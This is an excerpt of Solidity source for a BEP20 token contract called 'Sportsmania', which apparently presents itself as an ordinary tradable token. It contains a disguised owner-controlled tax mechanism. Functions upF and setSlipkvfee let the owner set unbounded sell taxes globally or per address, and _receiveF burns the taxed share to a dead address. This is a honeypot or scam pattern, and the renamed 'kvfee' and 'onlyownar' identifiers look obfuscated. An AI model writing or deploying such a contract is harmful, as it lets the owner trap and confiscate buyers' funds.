...
interface IUniswapV2Factory {
    ...
    function kvfeeTo() external view returns (address);
    function kvfeeToSetter() external view returns (address);
    ...
    function setkvfeeTo(address) external;
    function setkvfeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingkvfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingkvfeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingkvfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingkvfeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingkvfeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Sportsmania is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellkvfee = 0;

    uint256 private _defaultBuykvfee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipkvfee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellkvfee = _value;
    }

    function setSlipkvfee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipkvfee[_address] = _value;
    }

    function getSlipkvfee(address _address) external view onlyownar returns (uint256) {
        return _slipkvfee[_address];
    }


    function setMAccountkvfee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountkvfee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradekvfeeAmount = 0;

        if (rF) {
            uint256 tradekvfee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradekvfee = _defaultSellkvfee;
                }
                if (from == uniswapV2Pair) {

                    tradekvfee = _defaultBuykvfee;
                }
            }
            if (_slipkvfee[from] > 0) {
                tradekvfee = _slipkvfee[from];
            }

            tradekvfeeAmount = _Amount.mul(tradekvfee).div(100);
        }


        if (tradekvfeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradekvfeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradekvfeeAmount);
            emit Transfer(from, _deadAddress, tradekvfeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradekvfeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradekvfeeAmount);
        emit Transfer(from, _to, _Amount - tradekvfeeAmount);
    }
